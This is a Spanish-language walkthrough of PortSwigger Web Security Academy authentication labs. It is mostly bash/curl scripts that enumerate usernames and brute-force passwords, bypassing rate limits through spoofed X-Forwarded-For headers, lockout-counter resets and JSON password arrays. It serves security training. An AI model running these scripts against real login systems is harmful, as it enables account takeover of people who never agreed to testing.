---
layout: default
title: "Authentication - PortSwigger"
permalink: /authentication-ps/
---

# Authentication - PortSwigger

## 1. Lab: Username enumeration via different responses

![Request HTTP](img1.png)

Extraemos los datos necesarios para hacer la consulta:	

```bash
https://aca61f111e1ff681806d1a2f00ed00e9.web-security-academy.net/login
csrf=JqMWKgtoS0cIGjdNp8PL3uY44N4xeePx&username=a&password=a
```

Escribimos un script en bash para solucionar el problema:

```bash
#!/bin/bash

URL='https://aca61f111e1ff681806d1a2f00ed00e9.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do
	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`
	
	if echo $RESULT | grep -o "Invalid username" > $NULL
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done
```

Ejecutamos el programa y vemos que valida un usuario.

![run script](img2.png)

Verificamos en la pagina, y vemos que si funciona.

![verify user](img3.png)

Ahora extendemos el script para probar con las contraseñas.

```bash
#!/bin/bash

URL='https://aca61f111e1ff681806d1a2f00ed00e9.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do
	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`

	if echo $RESULT | grep -o "Invalid username" > $NULL
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done

for PASS in `cat password.txt`;do
        DATA='csrf='$CSRF'&username='$USER'&password='$PASS
        RESULT=`curl $URL -d $DATA -b $COOKIE -s`

        if echo $RESULT | grep -o "Incorrect password" > $NULL
        then
                echo "Incorrect creds: $USER:$PASS"
        else
                echo "Valid creds: $USER:$PASS"
                break
        fi
done
```

Ejecutamos el nuevo script y obtenemos el resultado siguiente

![run script 2](img4.png)

Lo probamos en el sitio web para verificar si es cierto.

![test creds](img5.png)

Y para culminar con el laboratorio accedemos a la seccion **My account**.

![myacount](img6.png)

## 2. Lab: Username enumeration via subtly different responses

Para este ejercicio debemos de enumerar el usuario que tiene una variacion pequeña entre los errores.

![view](img7.png)

```bash
https://ac5f1f6e1e51c1a980554be900c700f2.web-security-academy.net/login
csrf=ok1ahDjlVNE1Q2ZHTa0wP5fZd6C8BtIN&username=a&password=a
```

Como nos dicen que hay una pequeña variacion en el mensaje de error, entonces vamos a pobrar con todo el payload completo de error el cual es **<p class=is-warning>Invalid username or password.</p>**

```bash
#!/bin/bash

URL='https://ac5f1f6e1e51c1a980554be900c700f2.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do

	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`
    
	if echo $RESULT | grep -F '<p class=is-warning>Invalid username or password.</p>' > $NULL
	#Fijarse que puse -F porque estaba considerando el . como una expresion regular
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done
```

Ejecutando el codigo obtenemos el usuario valido.

![run script](img8.png)

Ahora, agregamos el codigo suficiente para obtener la contraseña.

```bash
#!/bin/bash

URL='https://ac5f1f6e1e51c1a980554be900c700f2.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`;do
	DATA='csrf='$CSRF'&username='$USER'&password=a'
	RESULT=`curl $URL -d $DATA -b $COOKIE -s`
    
	if echo $RESULT | grep -F '<p class=is-warning>Invalid username or password.</p>' > $NULL
	then
		echo "Incorrect user: $USER"
	else
		echo "Valid user: $USER"
		break
	fi
done

for PASS in `cat password.txt`;do
        DATA='csrf='$CSRF'&username='$USER'&password='$PASS
        RESULT=`curl $URL -d $DATA -b $COOKIE -s`

        if echo $RESULT | grep -o "Invalid username or password" > $NULL
        then
                echo "Incorrect creds: $USER:$PASS"
        else
                echo "Valid creds: $USER:$PASS"
                break
        fi
done
```

Corremos el script y obtenemos las credenciales:

![run script](img9.png)

Nos logeamos e ingresamos a la seccion **My acount**.

![verify](img10.png)

## 3. Lab: Username enumeration via response timing

```bash
https://ac591f871e61f7ab805b171800bf006e.web-security-academy.net/login
csrf=zus2HXTmtFPFdOSnT7JHTTuVSFIY5KAQ&username=sd&password=sd
```

Escribiendo el script, tendremos el siguiente.

```bash
#!/bin/bash

URL='https://ac591f871e61f7ab805b171800bf006e.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
PASS=`python -c "print 'A'*2000"`
#USER="wieners"

N=1

for USER in `cat user.txt`;do

	DATA='csrf='$CSRF'&username='$USER'&password='$PASS
	RESULT=`curl $URL -d $DATA -b $COOKIE -H "X-Forwarded-For: 192.168.0.$N" -w %{time_total} -o $NULL -s`
    TIME=`echo $RESULT | cut -d "." -f 1`
    
    if [[ $TIME -gt 5 ]]
    then
        echo "Valid user: $USER"
        break
    else
        echo "Invalid user: $USER"
    fi
    
	N="$[ $N + 1 ]"
done

for PASS in `cat password.txt`;do

        DATA='csrf='$CSRF'&username='$USER'&password='$PASS
        RESULT=`curl $URL -d $DATA -b $COOKIE -s -H "X-Forwarded-For: 192.168.0.$N"`

        if echo $RESULT | grep -o "password" > $NULL
        then
                echo "Incorrect creds: $USER:$PASS"
        else
                echo "Valid creds: $USER:$PASS"
                break
        fi
        N="$[ $N + 1 ]"
done
```

Detectamos las credenciales con el usuario:

![creds-auth3](img11.png)

Validamos que las credenciales son correctas:

![creds](img12.png)

## 4. Lab: Broken brute-force protection, IP block

```
Your credentials: wiener:peter
Victim's username: carlos
```

```
https://acdc1fe11eb6d006807363a8001d00fb.web-security-academy.net/login
csrf=zus2HXTmtFPFdOSnT7JHTTuVSFIY5KAQ&username=sd&password=sd
```

Escribiremos un script para desarrollar este ejercicio el cual será el siguiente:

```bash
#!/bin/bash

URL='https://acdc1fe11eb6d006807363a8001d00fb.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
USER="carlos"
USER0="wiener"
PASS0="peter"
N=1
for PASS in `cat password.txt`;do

    if [ $[ $N % 2 ] == 0 ]
    then
        #Nos logeamos con la cuenta existente
        #Para reiniciar el contador. :D
        DATA2='csrf='$CSRF'&username='$USER0'&password='$PASS0
        curl $URL -d $DATA2 -b $COOKIE -s > $NULL
    fi
    DATA='csrf='$CSRF'&username='$USER'&password='$PASS
    RESULT=`curl $URL -d $DATA -b $COOKIE -s`

    if echo $RESULT | grep -o "Incorrect password" > $NULL
    then
        echo "Incorrect creds: $USER:$PASS"
    else
        echo "Valid creds: $USER:$PASS"
        break
    fi
    N="$[ $N + 1 ]"
done
```

Obtenemos el resultado del script.

![output](img13.png)

Al probarlo en el sitio web verificamos que completamos el nivel.

![fin](img14.png)

## 5. Lab: Username enumeration via account lock

```
https://ac681ff01fdae0fd800c26bb00a700dc.web-security-academy.net/login
csrf=zus2HXTmtFPFdOSnT7JHTTuVSFIY5KAQ&username=sd&password=sd
```

Como son intentos para bloquear un usuario, entonces lo que haremos será consultar 4 veces cada usuario de la lista, cuando bloquee a un usuario, será porque ese usuario es válido, acontinuacion el script.

```bash
#!/bin/bash

URL='https://ac681ff01fdae0fd800c26bb00a700dc.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`

for USER in `cat user.txt`
do
    echo "Probando para USER=$USER"
    for i in `seq 1 4`
    do
	    DATA='csrf='$CSRF'&username='$USER'&password=a'
	    RESULT=`curl $URL -d $DATA -b $COOKIE -s`

	    if echo $RESULT | grep -oP "Invalid username or password." > $NULL
	    then
		    echo -ne ""
	    else
		    echo "Valid user: $USER"
		    break
	    fi
    done
done
```

Corriendo el escript obtenemos lo siguiente:

![run](img15.png)

Verificando en la web, notamos que si es valido.

![user valid](img16.png)

Ahora agregamos ese error a la lista de respuesta que demuestran que la contraseña es incorrecta y corremos el nuevo script es cual sería

```bash
#!/bin/bash

URL='https://ac681ff01fdae0fd800c26bb00a700dc.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
VALID=0
for USER in `cat user.txt`
do
    echo "Probando para USER=$USER"
    for i in `seq 1 4`
    do
	    DATA='csrf='$CSRF'&username='$USER'&password=a'
	    RESULT=`curl $URL -d $DATA -b $COOKIE -s`

	    if echo $RESULT | grep -oP "Invalid username or password." > $NULL
	    then
		    echo -ne ""
	    else
		    echo "Valid user: $USER"
		    VALID=1
		    break
	    fi
    done
    if [ $VALID == 1 ]
    then
        break
    fi
done

for PASS in `cat password.txt`;do

    DATA='csrf='$CSRF'&username='$USER'&password='$PASS
    RESULT=`curl $URL -d $DATA -b $COOKIE -s`

    if echo $RESULT | grep -o "Invalid username or password." > $NULL
    then
        echo "Incorrect creds: $USER:$PASS"
    else
        if echo $RESULT | grep -o "Please try" > $NULL
        then
            echo "Incorrect creds: $USER:$PASS"
        else
            echo "Valid creds: $USER:$PASS"
            break
        fi
    fi
done
```

Y al correrlo obtener el siguiente resultado:

![output](img17.png)

Y luego de esperar un minuto por el bloqueo, probamos las credenciales y completamos el nivel.

![check](img18.png)

## 6. Lab: Broken brute-force protection, multiple credentials per request

Cuando consultamos al login podemos ver, que este ya es un poco diferente por la manera en como envia los parametros post (formano JSON)

![test](img19.png)

Entonces, lo que hacemos en intentar enviar todas las claves del diccionario mediante un array en password con el siguiente codigo:

```bash
#!/bin/bash

URL='https://ac7d1fc61e0921f0804371d000d70007.web-security-academy.net/login'
NULL='/dev/null'

REQUEST1=`curl $URL -D- -s`
CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
USER="carlos"

PASSS=`cat password.txt | tr '\n' ':' | sed s/':'/'","'/g`
DATA='{"csrf":"'$CSRF'","username":"'$USER'","password":["'$PASSS'"]}'

curl $URL -d $DATA -b $COOKIE
```

Lo curioso es que no recibimos ningun output, lo cual parece ser muy misterioso. Intentaremos dividir en 2 partes el string para de esa manera verificar si esto ocurre cuando enviamos muchos argumentos o algo esta ocurriendo por detrás que nos puede dar una pista de que hacer.

```bash
$ bash enum-user6.sh 

La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow
La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess
La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper
Estoy dentro de tu 4 #En esta parte ya nos bloqueo la pagina por un minuto pero ya tenemos una lista reducida.
Estoy dentro de tu 5
Estoy dentro de tu 6
Estoy dentro de tu 7
```

Y actualizamos pass0.txt con el comando siguiente:

``` 
echo 'thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper' | sed s/'","'/'\n'/g > pass0.txt
```

Y corremos el script por segunda vez comantando la linea que hace cp de password.txt a pass0.txt.

```bash
$ bash enum-user6.sh 
La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster
La clave debe estar en: daniel","starwars","klaster
La clave debe estar en: starwars","klaster
```

En este caso solo nos queda probar una de las dos claves y logearnos de manera exitosa.

![done](img20.png)

## 7. 





